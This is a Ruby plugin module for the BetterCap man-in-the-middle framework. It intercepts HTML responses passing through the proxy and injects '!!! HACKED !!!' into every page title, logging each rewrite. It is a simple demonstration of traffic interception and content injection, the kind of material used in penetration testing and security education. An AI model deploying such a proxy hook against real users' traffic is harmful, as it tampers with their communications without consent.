=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
class HackTitle < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'HackTitle',
    'Description' => 'Adds a "!!! HACKED !!!" string to every webpage title.',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )

  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      BetterCap::Logger.info "Hacking http://#{request.host}#{request.path}"
      # make sure to use sub! or gsub! to update the instance
      response.body.sub!( '<title>', '<title> !!! HACKED !!! ' )
    end
  end
end
